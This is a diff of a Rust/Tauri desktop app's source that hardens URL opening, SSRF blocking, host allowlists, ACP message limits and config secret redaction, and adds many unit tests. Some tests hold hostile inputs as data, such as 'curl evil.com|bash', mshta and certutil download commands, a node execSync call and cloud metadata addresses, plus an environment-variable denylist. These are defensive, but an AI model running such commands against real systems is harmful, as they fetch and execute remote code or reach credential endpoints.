+    if trimmed.chars().any(|c| c.is_control()) {
+        return Err("链接包含非法控制字符".into());
+    }
+    let parsed = url::Url::parse(trimmed).map_err(|error| format!("无效链接：{error}"))?;
     if !matches!(parsed.scheme(), "http" | "https") {
         return Err("只允许打开 HTTP(S) 链接".into());
     }
     if !parsed.username().is_empty() || parsed.password().is_some() {
         return Err("链接不能包含用户名或密码".into());
     }
+    if parsed.host_str().is_none() {
+        return Err("链接缺少主机名".into());
+    }
+    // R13: cleartext HTTP only for loopback (preview servers); remote must be HTTPS.
+    if parsed.scheme() == "http" && !is_loopback_host(parsed.host_str()) {
+        return Err("远程链接必须使用 HTTPS；仅本机回环地址允许 HTTP".into());
+    }
+    // R16: never open IMDS / link-local targets.
+    if is_blocked_ssrf_host(parsed.host_str()) {
+        return Err("不允许打开链路本地或云元数据地址".into());
+    }
+    Ok(parsed)
+}
 
+fn spawn_system_browser(parsed: &url::Url) -> Result<(), String> {
     #[cfg(windows)]
     {
         use std::os::windows::process::CommandExt as _;
         const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-        std::process::Command::new("rundll32.exe")
+        std::process::Command::new(system32_tool("rundll32.exe"))
             .args(["url.dll,FileProtocolHandler", parsed.as_str()])
             .creation_flags(CREATE_NO_WINDOW)
             .spawn()
@@ -5929,6 +7438,36 @@ fn open_external(url: String) -> Result<(), String> {
     Ok(())
 }
 
+#[tauri::command]
+fn open_external(url: String) -> Result<(), String> {
+    let parsed = parse_browser_url(&url)?;
+    spawn_system_browser(&parsed)
+}
+
+/// Media Studio remote artifacts — HTTPS hosts must be on the media allowlist.
+#[tauri::command]
+fn open_media_external(url: String) -> Result<(), String> {
+    let parsed = parse_browser_url(&url)?;
+    if parsed.scheme() == "https" {
+        if !is_media_https_host_allowed(parsed.host_str()) {
+            return Err("媒体链接域名不在允许列表中".into());
+        }
+    } else if !(parsed.scheme() == "http" && is_loopback_host(parsed.host_str())) {
+        return Err("媒体链接必须是 HTTPS 允许域或本机 HTTP".into());
+    }
+    spawn_system_browser(&parsed)
+}
+
+/// Project preview — only loopback (dev servers bound to 127.0.0.1).
+#[tauri::command]
+fn open_preview_external(url: String) -> Result<(), String> {
+    let parsed = parse_browser_url(&url)?;
+    if !is_loopback_host(parsed.host_str()) {
+        return Err("预览只允许在本机回环地址打开".into());
+    }
+    spawn_system_browser(&parsed)
+}
+
 /// Start a fresh ACP child and stream each stdout JSON-RPC line to the webview.
 /// A repeated call intentionally replaces the old child so a webview reload
 /// cannot initialize the same agent process twice.
@@ -5938,8 +7477,13 @@ async fn acp_spawn(
     state: tauri::State<'_, Arc<AcpState>>,
     cwd: String,
 ) -> Result<(), String> {
+    // One spawn at a time: terminate → spawn → store must not interleave.
+    let _spawn_guard = state.spawn_lock.lock().await;
+
     // New child never inherits a previous silent-load filter.
-    state.silent_stream.store(false, Ordering::Relaxed);
+    if let Ok(mut guard) = state.silent_sessions.lock() {
+        guard.clear();
+    }
     let cwd = checked_workspace(&cwd)?;
 
     // Invalidate the previous readers before terminating their process. On a
@@ -6036,17 +7580,15 @@ async fn acp_spawn(
                     if line.is_empty() {
                         continue;
                     }
-                    // Silent agent-bind: agent still loads history in-process, but
-                    // we must not ship every sessionUpdate to the webview (that
-                    // freezes UI on multi-hundred-MB updates.jsonl). Keep responses
-                    // (have "result"/"error" + id, no sessionUpdate) and server
-                    // requests (requestPermission, etc.).
-                    if stdout_state.silent_stream.load(Ordering::Relaxed)
-                        && (line.contains("\"sessionUpdate\"")
-                            || line.contains("agent_thought_chunk")
-                            || line.contains("\"session/update\"")
-                            || line.contains("\"x.ai/session/update\""))
-                    {
+                    // R18: cap ACP event payload size before crossing into the webview.
+                    const MAX_ACP_EVENT_BYTES: usize = 2 * 1024 * 1024;
+                    if line.len() > MAX_ACP_EVENT_BYTES {
+                        // Oversized flood (or pathological binary-as-json) — drop.
+                        continue;
+                    }
+                    // Silent agent-bind: drop history floods only for sessions in
+                    // silent_sessions (per-session — other chats keep streaming).
+                    if should_drop_silent_history_line(&stdout_state, line) {
                         continue;
                     }
                     let _ = stdout_app.emit("acp-event", line);
@@ -6108,16 +7650,52 @@ async fn acp_spawn(
     Ok(())
 }
 
-/// Enable/disable silent ACP stream filtering (see AcpState::silent_stream).
+/// Enable/disable silent history filtering for a session (or clear all).
+/// - `silent=true` + session_id → add to silent set
+/// - `silent=false` + session_id → remove from set
+/// - `silent=false` + empty session_id → clear entire set
 #[tauri::command]
-fn acp_set_silent_stream(state: tauri::State<'_, Arc<AcpState>>, silent: bool) {
-    state.silent_stream.store(silent, Ordering::Relaxed);
+fn acp_set_silent_stream(
+    state: tauri::State<'_, Arc<AcpState>>,
+    silent: bool,
+    session_id: Option<String>,
+) {
+    // R18: bound silent-session set against webview thrash / unbounded growth.
+    const MAX_SILENT_SESSIONS: usize = 64;
+    const MAX_SESSION_ID_LEN: usize = 200;
+    let Ok(mut guard) = state.silent_sessions.lock() else {
+        return;
+    };
+    let sid = session_id.unwrap_or_default();
+    let sid = sid.trim();
+    if silent {
+        if sid.is_empty() || sid.len() > MAX_SESSION_ID_LEN {
+            return;
+        }
+        if guard.len() >= MAX_SILENT_SESSIONS && !guard.contains(sid) {
+            return;
+        }
+        guard.insert(sid.to_string());
+    } else if sid.is_empty() {
+        guard.clear();
+    } else {
+        guard.remove(sid);
+    }
 }
 
 #[tauri::command]
 async fn acp_send(state: tauri::State<'_, Arc<AcpState>>, line: String) -> Result<(), String> {
     if line.contains('\n') || line.contains('\r') {
         return Err("ACP 消息必须是单行 JSON".into());
+    }
+    // Bound stdin payload size (multimodal base64 still fits under 8 MiB).
+    const MAX_ACP_LINE_BYTES: usize = 8 * 1024 * 1024;
+    if line.len() > MAX_ACP_LINE_BYTES {
+        return Err(format!(
+            "ACP 消息过大（{} bytes，上限 {}）",
+            line.len(),
+            MAX_ACP_LINE_BYTES
+        ));
     }
     let mut guard = state.process.lock().await;
     let process = guard
@@ -6145,6 +7723,9 @@ async fn acp_kill(
     app: tauri::AppHandle,
     state: tauri::State<'_, Arc<AcpState>>,
 ) -> Result<(), String> {
+    // Same mutex as acp_spawn: concurrent kill during terminate→spawn must not
+    // bump generation mid-flight and orphan the new child stdout readers.
+    let _spawn_guard = state.spawn_lock.lock().await;
     state.next_generation.fetch_add(1, Ordering::Relaxed);
     if let Some(process) = state.process.lock().await.take() {
         terminate_process(process).await;
@@ -6274,6 +7855,91 @@ fn install_app_menu(app: &tauri::AppHandle) -> tauri::Result<()> {
     Ok(())
 }
 
+/// Append a line to %LOCALAPPDATA%\Grox\last-exit.log for post-mortem (crash vs clean close).
+/// Rotates when the file exceeds ~128 KiB so crash forensics stay bounded.
+fn append_lifecycle_log(reason: &str) {
+    let Ok(local) = std::env::var("LOCALAPPDATA") else {
+        eprintln!("grox lifecycle: {reason}");
+        return;
+    };
+    let dir = PathBuf::from(local).join("Grox");
+    let _ = fs::create_dir_all(&dir);
+    let path = dir.join("last-exit.log");
+    const MAX_LIFECYCLE_LOG_BYTES: u64 = 128 * 1024;
+    if fs::metadata(&path)
+        .map(|m| m.len() > MAX_LIFECYCLE_LOG_BYTES)
+        .unwrap_or(false)
+    {
+        let bak = dir.join("last-exit.prev.log");
+        let _ = fs::remove_file(&bak);
+        let _ = fs::rename(&path, &bak);
+    }
+    let stamp = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0);
+    // Keep a single line — no newlines from reason (panic paths may include multiline).
+    let safe_reason = reason
+        .chars()
+        .map(|c| if c == '\n' || c == '\r' { ' ' } else { c })
+        .take(2_048)
+        .collect::<String>();
+    let line = format!("{stamp}\t{safe_reason}\n");
+    if let Ok(mut file) = fs::OpenOptions::new().create(true).append(true).open(&path) {
+        use std::io::Write;
+        let _ = file.write_all(line.as_bytes());
+    }
+    eprintln!("grox lifecycle: {safe_reason}");
+}
+
+fn install_panic_lifecycle_hook() {
+    let previous = std::panic::take_hook();
+    std::panic::set_hook(Box::new(move |info| {
+        let payload = if let Some(s) = info.payload().downcast_ref::<&str>() {
+            (*s).to_string()
+        } else if let Some(s) = info.payload().downcast_ref::<String>() {
+            s.clone()
+        } else {
+            "unknown panic payload".into()
+        };
+        let loc = info
+            .location()
+            .map(|l| format!("{}:{}:{}", l.file(), l.line(), l.column()))
+            .unwrap_or_else(|| "unknown".into());
+        append_lifecycle_log(&format!("PANIC at {loc}: {payload}"));
+        previous(info);
+    }));
+}
+
+/// Second desktop shell would race ACP child ownership and Computer MCP bind.
+/// Hold a process-lifetime named mutex (Windows) so only one UI instance runs.
+#[cfg(windows)]
+fn acquire_single_instance_lock() -> Result<(), String> {
+    use windows::core::PCWSTR;
+    use windows::Win32::Foundation::{CloseHandle, GetLastError, ERROR_ALREADY_EXISTS};
+    use windows::Win32::System::Threading::CreateMutexW;
+
+    let name: Vec<u16> = "Local\\GroxDesktopSingleInstance\0"
+        .encode_utf16()
+        .collect();
+    unsafe {
+        let handle = CreateMutexW(None, true, PCWSTR(name.as_ptr()))
+            .map_err(|error| format!("无法创建单实例锁：{error}"))?;
+        if GetLastError() == ERROR_ALREADY_EXISTS {
+            let _ = CloseHandle(handle);
+            return Err("Grox 已在运行（只允许一个桌面实例）".into());
+        }
+        // HANDLE has no Drop/Close — leaving it open keeps the mutex until process exit.
+        let _ = handle;
+    }
+    Ok(())
+}
+
+#[cfg(not(windows))]
+fn acquire_single_instance_lock() -> Result<(), String> {
+    Ok(())
+}
+
 fn main() {
     let process_args = std::env::args().collect::<Vec<_>>();
     if process_args
@@ -6290,6 +7956,14 @@ fn main() {
         }
         return;
     }
+    install_panic_lifecycle_hook();
+    if let Err(error) = acquire_single_instance_lock() {
+        append_lifecycle_log(&format!("single-instance refuse: {error}"));
+        eprintln!("grox: {error}");
+        // Short-lived message box would need more UI; stderr + non-zero exit is enough.
+        std::process::exit(2);
+    }
+    append_lifecycle_log("start");
     tauri::Builder::default()
         .manage(Arc::new(AcpState::default()))
         .manage(Arc::new(PreviewState::default()))
@@ -6369,11 +8043,15 @@ fn main() {
             refresh_provider_models,
             activate_provider_profile,
             delete_provider_profile,
+            export_support_diagnostics,
             grok_runtime_info,
             set_grok_runtime_preference,
             install_official_grok_cli,
             open_external,
+            open_media_external,
+            open_preview_external,
             computer_session_extensions,
+            computer_use_env_enabled_cmd,
             computer_emergency_stop,
             computer_clear_emergency_stop,
             computer_revoke_http_auth,
@@ -6389,22 +8067,35 @@ fn main() {
             acp_set_silent_stream,
         ])
         .on_window_event(|window, event| {
-            if matches!(event, tauri::WindowEvent::Destroyed) {
-                let state = window.state::<Arc<AcpState>>().inner().clone();
-                let preview_state = window.state::<Arc<PreviewState>>().inner().clone();
-                tauri::async_runtime::spawn(async move {
-                    if let Some(process) = state.process.lock().await.take() {
-                        terminate_process(process).await;
-                    }
-                    if let Some(mut process) = preview_state.process.lock().await.take() {
-                        let _ = process.child.kill().await;
-                        let _ = process.child.wait().await;
-                    }
-                });
+            match event {
+                tauri::WindowEvent::CloseRequested { .. } => {
+                    append_lifecycle_log("window CloseRequested (user or system close)");
+                }
+                tauri::WindowEvent::Destroyed => {
+                    append_lifecycle_log("window Destroyed");
+                    let state = window.state::<Arc<AcpState>>().inner().clone();
+                    let preview_state = window.state::<Arc<PreviewState>>().inner().clone();
+                    tauri::async_runtime::spawn(async move {
+                        // Hold spawn_lock so a late acp_spawn cannot race teardown.
+                        let _spawn_guard = state.spawn_lock.lock().await;
+                        state.next_generation.fetch_add(1, Ordering::Relaxed);
+                        if let Some(process) = state.process.lock().await.take() {
+                            terminate_process(process).await;
+                        }
+                        if let Some(mut process) = preview_state.process.lock().await.take() {
+                            let _ = process.child.kill().await;
+                            let _ = process.child.wait().await;
+                        }
+                        // Revoke local Computer Use MCP so orphans cannot drive the desktop.
+                        let _ = computer_mcp::revoke_http_auth();
+                    });
+                }
+                _ => {}
             }
         })
         .run(tauri::generate_context!())
         .expect("error while running Grox Desktop");
+    append_lifecycle_log("run() returned (normal process end)");
 }
 
 #[cfg(test)]
@@ -6561,9 +8252,12 @@ api_key = "local-key"
         fs::write(&inside, b"png-bytes").unwrap();
         let outside = std::env::temp_dir().join(format!("grox-media-out-{stamp}.png"));
         fs::write(&outside, b"outside").unwrap();
-        let output = format!("{}\n{}\nhttps://cdn.example/a.png\n", inside.display(), outside.display());
+        let output = format!(
+            "{}\n{}\nhttps://cdn.x.ai/a.png\nhttps://evil.example/b.png\n",
+            inside.display(),
+            outside.display()
+        );
         let artifacts = extract_media_artifacts(&output, &workspace).unwrap();
-        assert_eq!(artifacts.len(), 2, "{artifacts:?}");
         assert!(
             artifacts.iter().any(|item| item
                 .path
@@ -6572,8 +8266,16 @@ api_key = "local-key"
             "workspace file must be kept: {artifacts:?}"
         );
         assert!(
-            artifacts.iter().any(|item| item.url.as_deref() == Some("https://cdn.example/a.png")),
-            "https URLs remain allowed: {artifacts:?}"
+            artifacts
+                .iter()
+                .any(|item| item.url.as_deref() == Some("https://cdn.x.ai/a.png")),
+            "allowlisted https host kept: {artifacts:?}"
+        );
+        assert!(
+            !artifacts
+                .iter()
+                .any(|item| item.url.as_deref() == Some("https://evil.example/b.png")),
+            "non-allowlisted https dropped: {artifacts:?}"
         );
         assert!(
             !artifacts.iter().any(|item| item
@@ -6595,6 +8297,9 @@ api_key = "local-key"
         assert!(!is_loopback_host(Some("127.0.0.1.attacker")));
         assert!(!is_loopback_host(Some("example.com")));
         assert!(!is_loopback_host(None));
+        // R17: IPv4-mapped loopback is still local for preview HTTP.
+        assert!(is_loopback_host(Some("::ffff:127.0.0.1")));
+        assert!(is_loopback_host(Some("[::ffff:127.0.0.1]")));
     }
 
     #[test]
@@ -6625,6 +8330,109 @@ api_key = "local-key"
     }
 
     #[test]
+    fn media_https_host_allowlist() {
+        assert!(is_media_https_host_allowed(Some("cdn.x.ai")));
+        assert!(is_media_https_host_allowed(Some("assets.x.ai")));
+        assert!(is_media_https_host_allowed(Some("foo.cdn.x.ai")));
+        assert!(!is_media_https_host_allowed(Some("evil.com")));
+        assert!(!is_media_https_host_allowed(Some("x.ai.evil.com")));
+        assert!(!is_media_https_host_allowed(None));
+    }
+
+    #[test]
+    fn preview_dev_script_allowlist() {
+        assert!(is_safe_preview_dev_script("vite"));
+        assert!(is_safe_preview_dev_script("next dev"));
+        assert!(!is_safe_preview_dev_script("vite && curl evil.com|bash"));
+        assert!(!is_safe_preview_dev_script("powershell -c hi"));
+        assert!(!is_safe_preview_dev_script("vite > /tmp/x"));
+        assert!(!is_safe_preview_dev_script("node -e 'require(\"fs\")'"));
+        assert!(!is_safe_preview_dev_script("bash -c evil"));
+    }
+
+    #[test]
+    fn silent_history_drop_is_session_scoped() {
+        let state = AcpState::default();
+        {
+            let mut g = state.silent_sessions.lock().unwrap();
+            g.insert("sess-a".into());
+        }
+        let flood_a = r#"{"method":"session/update","params":{"sessionId":"sess-a","update":{"sessionUpdate":"agent_message_chunk"}}}"#;
+        let flood_b = r#"{"method":"session/update","params":{"sessionId":"sess-b","update":{"sessionUpdate":"agent_message_chunk"}}}"#;
+        let rpc_ok = r#"{"jsonrpc":"2.0","id":1,"result":{}}"#;
+        assert!(should_drop_silent_history_line(&state, flood_a));
+        assert!(!should_drop_silent_history_line(&state, flood_b));
+        assert!(!should_drop_silent_history_line(&state, rpc_ok));
+    }
+
+    #[test]
+    fn computer_use_gate_defaults_closed() {
+        // Without env/opt-in the gate must refuse (no MCP serve).
+        // Do not set_var here — process-global env races other parallel tests.
+        assert!(!computer_use_env_flag(None));
+        assert!(!computer_use_env_flag(Some("0")));
+        // Gate with explicit operator flag only (env path covered by flag unit test).
+        // When env is unset in this process, operator Some(true) still opens.
+        if !computer_use_env_enabled() {
+            assert!(!computer_use_gate_open(None));
+            assert!(!computer_use_gate_open(Some(false)));
+        }
+        assert!(computer_use_gate_open(Some(true)));
+    }
+
+    #[test]
+    fn computer_use_env_flag_shapes_open_gate_logic() {
+        // Pure — no process env mutation (avoids cargo test races).
+        assert!(computer_use_env_flag(Some("1")));
+        assert!(computer_use_env_flag(Some("true")));
+        assert!(computer_use_env_flag(Some("TRUE")));
+        assert!(computer_use_env_flag(Some(" true ")));
+        assert!(!computer_use_env_flag(Some("0")));
+        assert!(!computer_use_env_flag(Some("")));
+        assert!(!computer_use_env_flag(None));
+        // Gate ORs env with operator flag: model env-on via pure flag.
+        let env_on = computer_use_env_flag(Some("1"));
+        assert!(env_on || false); // env alone would open
+        assert!(env_on || false || false);
+    }
+
+    #[test]
+    fn computer_session_extensions_soft_ok_when_gate_closed() {
+        // Off-path must not kill session lifecycle — empty MCP only.
+        std::env::remove_var("GROX_COMPUTER_USE");
+        let none = computer_session_extensions(None).expect("gate-closed is Ok");
+        assert!(none.mcp_servers.is_empty());
+        assert!(none.plugin_dirs.is_empty());
+        assert!(none.lease_id.is_empty());
+        let off = computer_session_extensions(Some(false)).expect("explicit off is Ok");
+        assert!(off.mcp_servers.is_empty());
+        assert!(off.plugin_dirs.is_empty());
+        assert!(off.lease_id.is_empty());
+    }
+
+    #[test]
+    fn path_is_inside_workspace_accepts_descendant() {
+        let stamp = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_millis())
+            .unwrap_or(0);
+        let root = std::env::temp_dir().join(format!("grox-ws-in-{stamp}"));
+        fs::create_dir_all(root.join("nested")).unwrap();
+        let ws = root.canonicalize().unwrap();
+        let inside = ws.join("nested").join("file.txt");
+        fs::write(&inside, b"x").unwrap();
+        let inside_c = inside.canonicalize().unwrap();
+        assert!(path_is_inside_workspace(&ws, &inside_c));
+        assert!(path_is_inside_workspace(&ws, &ws));
+        let outside_path = std::env::temp_dir().join(format!("grox-ws-out-{stamp}.txt"));
+        fs::write(&outside_path, b"y").unwrap();
+        let outside = outside_path.canonicalize().unwrap();
+        assert!(!path_is_inside_workspace(&ws, &outside));
+        let _ = fs::remove_dir_all(&root);
+        let _ = fs::remove_file(&outside);
+    }
+
+    #[test]
     fn cli_env_denylist_blocks_host_sensitive_keys() {
         assert!(is_denied_cli_env_key("PATH"));
         assert!(is_denied_cli_env_key("path"));
@@ -6632,8 +8440,483 @@ api_key = "local-key"
         assert!(is_denied_cli_env_key("HTTP_PROXY"));
         assert!(is_denied_cli_env_key("LD_PRELOAD"));
         assert!(is_denied_cli_env_key("NODE_OPTIONS"));
+        assert!(is_denied_cli_env_key("CORECLR_PROFILER"));
+        assert!(is_denied_cli_env_key("RUSTC_WRAPPER"));
+        assert!(is_denied_cli_env_key("BASH_ENV"));
+        assert!(is_denied_cli_env_key("DOCKER_HOST"));
+        assert!(is_denied_cli_env_key("RUSTFLAGS"));
         assert!(!is_denied_cli_env_key("XAI_API_KEY"));
         assert!(!is_denied_cli_env_key("GROK_MODELS_BASE_URL"));
+    }
+
+    #[test]
+    fn skipped_workspace_dirs_cover_heavy_tooling() {
+        assert!(is_skipped_workspace_dir("node_modules"));
+        assert!(is_skipped_workspace_dir(".git"));
+        assert!(is_skipped_workspace_dir(".next"));
+        assert!(is_skipped_workspace_dir("__pycache__"));
+        assert!(!is_skipped_workspace_dir("src"));
+        assert!(!is_skipped_workspace_dir("apps"));
+    }
+
+    #[test]
+    fn update_download_host_allowlist() {
+        assert!(is_allowed_update_download_host(Some("github.com")));
+        assert!(is_allowed_update_download_host(Some("objects.githubusercontent.com")));
+        assert!(is_allowed_update_download_host(Some("release-assets.githubusercontent.com")));
+        assert!(is_allowed_update_download_host(Some("api.github.com")));
+        assert!(!is_allowed_update_download_host(Some("evil.com")));
+        assert!(!is_allowed_update_download_host(Some("github.com.evil.com")));
+        assert!(!is_allowed_update_download_host(Some("")));
+        assert!(!is_allowed_update_download_host(None));
+    }
+
+    #[test]
+    fn open_external_rejects_remote_http_and_credentials() {
+        // Validation only — do not actually spawn a browser.
+        assert!(parse_browser_url("http://evil.example/phish").is_err());
+        assert!(parse_browser_url("http://127.0.0.1:5173/").is_ok());
+        assert!(parse_browser_url("https://github.com/congqianv/Grox/releases").is_ok());
+        assert!(parse_browser_url("https://user:pass@evil.example/").is_err());
+        assert!(parse_browser_url("https://169.254.169.254/latest/meta-data/").is_err());
+        assert!(parse_browser_url("https://metadata.google.internal/").is_err());
+    }
+
+    #[test]
+    fn blocked_ssrf_hosts_cover_imds() {
+        assert!(is_blocked_ssrf_host(Some("169.254.169.254")));
+        assert!(is_blocked_ssrf_host(Some("metadata.google.internal")));
+        assert!(is_blocked_ssrf_host(Some("METADATA.GOOGLE.INTERNAL")));
+        assert!(is_blocked_ssrf_host(Some("instance-data.ec2.internal")));
+        assert!(is_blocked_ssrf_host(Some("100.100.100.200"))); // Aliyun IMDS
+        assert!(is_blocked_ssrf_host(Some("255.255.255.255")));
+        // R17: IPv4-mapped IPv6 IMDS must not bypass the V4-only check.
+        assert!(is_blocked_ssrf_host(Some("::ffff:169.254.169.254")));
+        assert!(is_blocked_ssrf_host(Some("[::ffff:169.254.169.254]")));
+        assert!(is_blocked_ssrf_host(Some("::ffff:100.100.100.200")));
+        // R22: trailing-dot FQDN must not bypass denylist / IpAddr parse.
+        assert!(is_blocked_ssrf_host(Some("169.254.169.254.")));
+        assert!(is_blocked_ssrf_host(Some("metadata.google.internal.")));
+        assert!(is_blocked_ssrf_host(Some("instance-data.ec2.internal.")));
+        assert!(is_blocked_ssrf_host(Some("100.100.100.200.")));
+        assert!(!is_blocked_ssrf_host(Some("127.0.0.1")));
+        assert!(!is_blocked_ssrf_host(Some("::ffff:127.0.0.1"))); // loopback mapped still not IMDS
+        assert!(!is_blocked_ssrf_host(Some("api.openai.com")));
+        assert!(!is_blocked_ssrf_host(Some("10.0.0.5"))); // LAN proxies still allowed
+    }
+
+    #[test]
+    fn parse_browser_url_rejects_ipv4_mapped_imds() {
+        assert!(parse_browser_url("https://[::ffff:169.254.169.254]/latest/meta-data/").is_err());
+        assert!(parse_browser_url("http://[::ffff:169.254.169.254]/").is_err());
+        assert!(checked_service_url("https://[::ffff:169.254.169.254]/v1", "服务地址").is_err());
+    }
+
+    #[test]
+    fn checked_service_url_rejects_imds() {
+        assert!(checked_service_url("https://169.254.169.254/v1", "服务地址").is_err());
+        assert!(checked_service_url("https://169.254.169.254./v1", "服务地址").is_err());
+        assert!(checked_service_url("https://metadata.google.internal./", "服务地址").is_err());
+        assert!(checked_service_url("https://api.example.com/v1", "服务地址").is_ok());
+        assert!(checked_service_url("http://127.0.0.1:8000/v1", "服务地址").is_ok());
+    }
+
+    #[test]
+    fn media_external_host_gate_matches_allowlist() {
+        assert!(is_media_https_host_allowed(Some("cdn.x.ai")));
+        assert!(!is_media_https_host_allowed(Some("evil.example")));
+        // parse_browser_url + media allowlist composition
+        let ok = parse_browser_url("https://cdn.x.ai/a.png").unwrap();
+        assert!(is_media_https_host_allowed(ok.host_str()));
+        let bad = parse_browser_url("https://evil.example/a.png").unwrap();
+        assert!(!is_media_https_host_allowed(bad.host_str()));
+    }
+
+    #[test]
+    fn resolve_git_executable_is_absolute_or_none() {
+        match resolve_git_executable() {
+            Some(path) => {
+                assert!(path.is_absolute(), "git must be absolute: {}", path.display());
+                let name = path
+                    .file_name()
+                    .and_then(|n| n.to_str())
+                    .unwrap_or("")
+                    .to_ascii_lowercase();
+                assert!(
+                    name == "git" || name == "git.exe",
+                    "unexpected git basename: {}",
+                    path.display()
+                );
+            }
+            None => {
+                // Fail-closed when no known install root has git — OK.
+            }
+        }
+    }
+
+    #[test]
+    fn safe_cli_env_value_rejects_control_and_oversize() {
+        assert!(is_safe_cli_env_value("sk-abc123"));
+        assert!(is_safe_cli_env_value("https://api.example.com/v1"));
+        assert!(!is_safe_cli_env_value("line1\nline2"));
+        assert!(!is_safe_cli_env_value("a\0b"));
+        assert!(!is_safe_cli_env_value(&"x".repeat(16 * 1024 + 1)));
+    }
+
+    #[test]
+    fn session_cache_json_object_gate() {
+        // Predicate surface used by write_session_cache before disk write.
+        assert!(serde_json::from_str::<serde_json::Value>(r#"{"id":"s1"}"#)
+            .ok()
+            .is_some_and(|v| v.is_object()));
+        assert!(!serde_json::from_str::<serde_json::Value>(r#"[1,2,3]"#)
+            .ok()
+            .is_some_and(|v| v.is_object()));
+        assert!(serde_json::from_str::<serde_json::Value>("not-json").is_err());
+    }
+
+    #[test]
+    fn provider_redirect_policy_blocks_remote_http() {
+        let https = url::Url::parse("https://api.example.com/v1/models").unwrap();
+        assert!(should_follow_provider_redirect(&https));
+        let loopback = url::Url::parse("http://127.0.0.1:8080/models").unwrap();
+        assert!(should_follow_provider_redirect(&loopback));
+        let remote_http = url::Url::parse("http://evil.example/models").unwrap();
+        assert!(!should_follow_provider_redirect(&remote_http));
+        let ftp = url::Url::parse("ftp://files.example/x").unwrap();
+        assert!(!should_follow_provider_redirect(&ftp));
+    }
+
+    #[test]
+    fn update_redirect_policy_stays_on_github_hosts() {
+        let gh = url::Url::parse("https://github.com/congqianv/Grox/releases/download/x/a.exe").unwrap();
+        assert!(should_follow_update_redirect(&gh));
+        let objects =
+            url::Url::parse("https://objects.githubusercontent.com/github-production-release-asset/1")
+                .unwrap();
+        assert!(should_follow_update_redirect(&objects));
+        let evil = url::Url::parse("https://evil.example/payload.exe").unwrap();
+        assert!(!should_follow_update_redirect(&evil));
+        let http_gh = url::Url::parse("http://github.com/x").unwrap();
+        assert!(!should_follow_update_redirect(&http_gh));
+    }
+
+    #[test]
+    fn resolve_package_manager_command_is_absolute_or_none() {
+        for manager in ["npm", "pnpm", "yarn", "bun"] {
+            match resolve_package_manager_command(manager) {
+                Some(path) => {
+                    assert!(
+                        path.is_absolute(),
+                        "manager={manager} must be absolute: {}",
+                        path.display()
+                    );
+                    let name = path
+                        .file_name()
+                        .and_then(|n| n.to_str())
+                        .unwrap_or("")
+                        .to_ascii_lowercase();
+                    assert!(
+                        name.contains(manager),
+                        "manager={manager} path={}",
+                        path.display()
+                    );
+                }
+                None => {
+                    // Fail-closed when no known install root has the binary — OK.
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn preview_dev_script_rejects_script_host_abuse() {
+        assert!(!is_safe_preview_dev_script("vite && mshta evil.hta"));
+        assert!(!is_safe_preview_dev_script("node --eval require('fs')"));
+        assert!(!is_safe_preview_dev_script("certutil -urlcache"));
+        // R22: Windows exe suffix must not bypass denylist while still matching vite.
+        assert!(!is_safe_preview_dev_script(
+            "node.exe -e \"require('child_process').execSync('calc')\" /* vite */"
+        ));
+        assert!(!is_safe_preview_dev_script("python.exe -c \"print(1)\" vite"));
+        assert!(is_safe_preview_dev_script("vite"));
+    }
+
+    #[test]
+    fn dangerous_open_extension_covers_exec_and_scripts() {
+        assert!(is_dangerous_open_extension(Path::new(r"C:\ws\tool.exe")));
+        assert!(is_dangerous_open_extension(Path::new(r"C:\ws\run.ps1")));
+        assert!(is_dangerous_open_extension(Path::new(r"C:\ws\a.bat")));
+        assert!(is_dangerous_open_extension(Path::new(r"C:\ws\x.lnk")));
+        assert!(is_dangerous_open_extension(Path::new(r"C:\ws\payload.hta")));
+        assert!(is_dangerous_open_extension(Path::new(r"C:\ws\x.jar")));
+        assert!(is_dangerous_open_extension(Path::new(r"C:\ws\x.scf")));
+        assert!(is_dangerous_open_extension(Path::new(r"C:\ws\x.mjs")));
+        assert!(!is_dangerous_open_extension(Path::new(r"C:\ws\readme.md")));
+        assert!(!is_dangerous_open_extension(Path::new(r"C:\ws\photo.png")));
+    }
+
+    #[test]
+    fn svg_preview_is_text_not_image() {
+        let (kind, mime) = preview_type(Path::new("diagram.svg"));
+        assert_eq!(kind, "text");
+        assert_eq!(mime, "text/plain");
+        let (kind, mime) = preview_type(Path::new("photo.png"));
+        assert_eq!(kind, "image");
+        assert_eq!(mime, "image/png");
+    }
+
+    #[test]
+    fn image_mime_detects_common_headers() {
+        assert_eq!(image_mime(b"\x89PNG\r\n\x1a\nrest"), Some("image/png"));
+        assert_eq!(image_mime(b"\xff\xd8\xff\xe0rest"), Some("image/jpeg"));
+        // 12-byte minimum for WEBP RIFF header
+        let webp_buf = b"RIFF\x00\x00\x00\x00WEBPdata";
+        assert_eq!(image_mime(webp_buf), Some("image/webp"));
+        assert_eq!(image_mime(b"<html>"), None);
+    }
+
+    #[test]
+    fn redact_config_document_secrets_masks_api_keys() {
+        let raw = r#"
+# comment
+[model.foo]
+api_key = "sk-super-secret-key-value"
+base_url = "https://api.example.com"
+XAI_API_KEY=plain-env-secret
+"#;
+        let redacted = redact_config_document_secrets(raw);
+        assert!(!redacted.contains("sk-super-secret"));
+        assert!(!redacted.contains("plain-env-secret"));
+        assert!(redacted.contains(CONFIG_SECRET_REDACTED));
+        assert!(redacted.contains("base_url"));
+    }
+
+    #[test]
+    fn merge_config_secrets_preserves_real_keys_from_disk() {
+        let existing = r#"
+[model.foo]
+api_key = "sk-real-key-on-disk"
+base_url = "https://api.example.com"
+"#;
+        let incoming = r#"
+[model.foo]
+api_key = "********"
+base_url = "https://api.example.com/v2"
+"#;
+        let merged = merge_config_secrets_from_existing(existing, incoming).expect("merge");
+        assert!(merged.contains("sk-real-key-on-disk"));
+        assert!(merged.contains("/v2"));
+        assert!(!merged.contains(CONFIG_SECRET_REDACTED));
+    }
+
+    #[test]
+    fn merge_config_secrets_is_table_keyed_not_positional() {
+        let existing = r#"
+[model.local]
+api_key = "local-key"
+base_url = "http://127.0.0.1:8000/v1"
+
+[model."grok-4.5"]
+api_key = "sk-prod-real"
+base_url = "https://api.example.com/v1"
+"#;
+        // Operator deleted [model.local] — remaining redacted key must NOT
+        // pick up local-key by position.
+        let incoming = r#"
+[model."grok-4.5"]
+api_key = "********"
+base_url = "https://api.example.com/v1"
+"#;
+        let merged = merge_config_secrets_from_existing(existing, incoming).expect("merge");
